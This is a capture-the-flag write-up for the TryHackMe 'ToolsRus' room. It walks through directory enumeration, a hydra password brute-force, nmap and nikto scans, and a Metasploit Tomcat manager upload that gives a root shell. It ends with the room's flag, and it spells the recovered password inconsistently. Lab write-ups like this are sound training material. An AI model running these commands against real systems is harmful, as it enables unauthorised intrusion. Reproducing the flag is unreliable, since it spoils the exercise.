@@ -1,0 +1,143 @@
+I"i<p>It’s a write-up about the room : <a href="https://tryhackme.com/room/toolsRus">Try Hack Me - Room : ToolsRus</a></p>
+
+<h1 id="task-1-toysrus">[Task 1] ToysRus</h1>
+
+<p><img src="/assets/img/thm/toolsRus/task-1.png" alt="Task 1" /></p>
+
+<p>First, we deploy the machine.</p>
+
+<ul>
+  <li>What directory can you find, that begins with a “g”?</li>
+</ul>
+
+<p>We use <code class="language-plaintext highlighter-rouge">Dirbuster</code> with :</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre></td> --><td class="rouge-code"><pre>Target Url : http://ip_machine:80/
+File with lists of dirs/files : directory-list-2.3-medium.txt
+Dir to start with : /
+File extension : php
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>The directory that begins with a “g” is <strong>guidelines</strong>.</p>
+
+<ul>
+  <li>Whose name can you find from this directory?</li>
+</ul>
+
+<p>Go to : <code class="language-plaintext highlighter-rouge">http://ip_machine/guidelines</code> and find the message :</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td> --><td class="rouge-code"><pre>Hey bob, did you update that TomCat server? 
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Therefore the name is <strong>bob</strong>.</p>
+
+<ul>
+  <li>What directory has basic authentication?</li>
+</ul>
+
+<p>With dirbuster, we find the directory <strong>protected</strong> which needs basic authentication.</p>
+
+<ul>
+  <li>What is bob’s password to the protected part of the website?</li>
+</ul>
+
+<p>We use <code class="language-plaintext highlighter-rouge">hydra</code> in a terminal : <code class="language-plaintext highlighter-rouge">hydra -l bob -P rockyou.txt -f ip_machine http-get /protected/</code><br />
+We find <strong>bubbles</strong> as password.</p>
+
+<ul>
+  <li>What other port that serves a webs service is open on the machine?</li>
+</ul>
+
+<p>We use nmap to see all the ports : ` nmap -sV ip_machine`</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre></td> --><td class="rouge-code"><pre>PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
+1234/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
+8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>The other port that serves a webs service which is open is the port <strong>1234</strong>.</p>
+
+<ul>
+  <li>Going to the service running on that port, what is the name and version of the software?</li>
+</ul>
+
+<p>Go on <code class="language-plaintext highlighter-rouge">http://ip_machine:1234/</code>.<br />
+On that page we find the name and the version of the software : <strong>Apache Tomcat/7.0.88</strong>.</p>
+
+<ul>
+  <li>Use Nikto with the credentials you have found and scan the /manager/html directory on the port found above. How many documentation files did Nikto identify?</li>
+</ul>
+
+<p>Go on <code class="language-plaintext highlighter-rouge">http://ip_machine:1234/manager/html</code> with the credentials :</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td> --><td class="rouge-code"><pre>login : bob
+password : bubble
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>We could also use : <code class="language-plaintext highlighter-rouge">nikto -h http://ip_machine:1234/manager/html -id bob:bublles</code>.
+We find <strong>5</strong> documentation files.</p>
+
+<ul>
+  <li>What is the server version (run the scan against port 80)?</li>
+</ul>
+
+<p>With nmap, we find the server version <strong>Apache/2.4.18</strong> for the port 80.</p>
+
+<ul>
+  <li>What version of Apache-Coyote is this service using?</li>
+</ul>
+
+<p>With nmap also, we find the service version of Apache-Coyote which is <strong>1.1</strong>.</p>
+
+<ul>
+  <li>Use Metasploit to exploit the service and get a shell on the system. What user did you get a shell as?</li>
+</ul>
+
+<p>To launch metasploit on the console : <code class="language-plaintext highlighter-rouge">msfconsole</code>.<br />
+After we use this different command :</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre></td> --><td class="rouge-code"><pre>search tomcat  
+use multi/http/tomcat_mgr_upload
+show options
+set httpPassword bubbles
+set httpUsername bob
+set RHOSTS ip_machine
+SET RPORT 1234
+run
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Then , we can use the shell by typing <code class="language-plaintext highlighter-rouge">shell</code>.
+To see what user we are, we use <code class="language-plaintext highlighter-rouge">whoami</code>. <br />
+The output is <strong>root</strong>.</p>
+
+<ul>
+  <li>What text is in the file /root/flag.txt ?</li>
+</ul>
+
+<p>We use cat to see the flag : <code class="language-plaintext highlighter-rouge">cat /root/flag.txt</code>.<br />
+The flag is <strong>ff1fc4a81affcc7688cf89ae7dc6e0e1</strong>.</p>
+:ET
